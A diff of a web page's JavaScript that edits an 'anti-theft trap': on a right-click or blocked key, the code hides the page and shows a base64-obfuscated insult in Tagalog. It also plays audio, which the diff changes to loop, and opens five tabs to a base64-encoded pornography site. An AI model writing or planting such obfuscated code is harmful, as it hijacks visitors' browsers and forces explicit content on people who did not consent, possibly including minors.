@@ -143,20 +143,24 @@
 
             // ANTI-THEFT TRAP
             const _L = () => {
-                if (_triggered) return;
-                _triggered = true;
-                _C.style.display = 'none';
-                let e = d.createElement('div');
-                e.innerHTML = a('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48cD5OYWdoYWhhbmFwIGthIGJhIG5nIGNvZGVzPyBLdXBhbCBrYSBiYSBib2k/IPCfnanwnZicPC9wPjwvZGl2Pg==');
-                d.body.appendChild(e.firstChild);
-                s('tz').style.display = 'flex';
-                _B.pause();
-                _M.currentTime = 0;
-                _M.play().catch(() => {});
-                setTimeout(() => {
-                    for (let i = 0; i < 5; i++) window.open(a('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'), '_blank');
-                }, 2000);
-            };
+            if (_triggered) return;
+            _triggered = true;
+            _C.style.display = 'none';
+            let e = d.createElement('div');
+            e.innerHTML = a('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48cD5OYWdoYWhhbmFwIGthIGJhIG5nIGNvZGVzPyBLdXBhbCBrYSBiYSBib2k/IPCfnanwnZicPC9wPjwvZGl2Pg==');
+            d.body.appendChild(e.firstChild);
+            s('tz').style.display = 'flex';
+            
+            _B.pause(); // Stops background music
+            
+            _M.currentTime = 0;
+            _M.loop = true; // <--- ADD THIS LINE TO ENABLE LOOPING
+            _M.play().catch(() => {});
+            
+            setTimeout(() => {
+                for (let i = 0; i < 5; i++) window.open(a('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'), '_blank');
+            }, 2000);
+        };
 
             // BLOCKING KEYS & CLICKS
             d.oncontextmenu = e => { e.preventDefault(); _L(); return false; };
